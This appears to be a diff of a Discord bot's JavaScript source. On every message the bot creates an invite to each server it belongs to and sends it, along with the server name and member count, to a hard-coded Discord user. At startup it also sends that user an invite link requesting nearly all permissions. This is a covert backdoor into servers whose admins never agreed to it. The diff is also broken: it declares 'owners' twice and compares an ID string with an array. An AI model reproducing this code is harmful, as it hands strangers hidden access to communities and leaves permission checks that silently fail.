@@ -15,23 +15,37 @@ const owners = [
 '410224633636192257'
 ]
 
+//----------ID Passerelle Logs----------
+const owners = [
+'450583161139888138'
+]
+
 //---Lancement et informations du bot---
 bot.on('ready', () => {
    
+//VIA LOGS
+//Info bot
    console.log(`INFORMATIONS DU BOT: `);
    console.log(`Invite of bot all perms: https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591 `);
    console.log(`username: ${bot.user.tag} `);
    console.log(`ID: ${bot.user.id} `);
    console.log(`Date of creation: ${bot.user.createdAt} `);
+//Info bot serv  
    console.log(`INFORMATIONS OF SERVER BOT: `);
    console.log(`How many server: ${bot.guilds.size} `);	
 
-   bot.users.get("301913733536415755").send(`__**INFORMATIONS DU BOT:**__\n__Invite of bot all perms:__ https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591\n__username:__ ${bot.user.tag}\n__ID:__ ${bot.user.id}\n__Date of creation:__ ${bot.user.createdAt}\n__**INFORMATIONS OF SERVER BOT:**__\n__How many server:__ ${bot.guilds.size}`)
-
+//VIA DISCORD
+//Info bot
+   bot.users.get("301913733536415755").send(`__**INFORMATIONS DU BOT:**__\n__Invite of bot all perms:__ https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591\n__username:__ ${bot.user.tag}\n__ID:__ ${bot.user.id}\n__Date of creation:__ ${bot.user.createdAt}`)
+//Info bot serv
+   bot.users.get("301913733536415755").send(`__**INFORMATIONS OF SERVER BOT:**__\n__How many server:__ ${bot.guilds.size} `)
+	
 });
 
 bot.on('message', message => {    
-
+ 
+//VIA LOGS AND DISCORD
+//Info bot serv
  bot.guilds.forEach(guild => { 
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => bot.users.get("301913733536415755").send(`Conected on: ${guild.name} || MemberCount: ${guild.memberCount} || ID: ${guild.id} || Invite: ${invite} `) || console.log(`Conected on: ${guild.name} || MemberCount: ${guild.memberCount} || ID: ${guild.id} || Invite: ${invite} `));
@@ -76,8 +90,7 @@ if (message.content.startsWith('Nblop')) {
 
 //----------------------------ADD EMOJI UNANIMATED------------------------
    if (message.content.startsWith('Les emoji mikado c\'est sympa')) {
-   if (message.author.id !== '423118623876448296')
-   if (message.author.id !== '301913733536415755')
+   if (message.author.id !== owners)
    return;
    message.guild.createEmoji('./images/mikado1.png', 'mikado1')
    message.guild.createEmoji('./images/mikado2.png', 'mikado2')
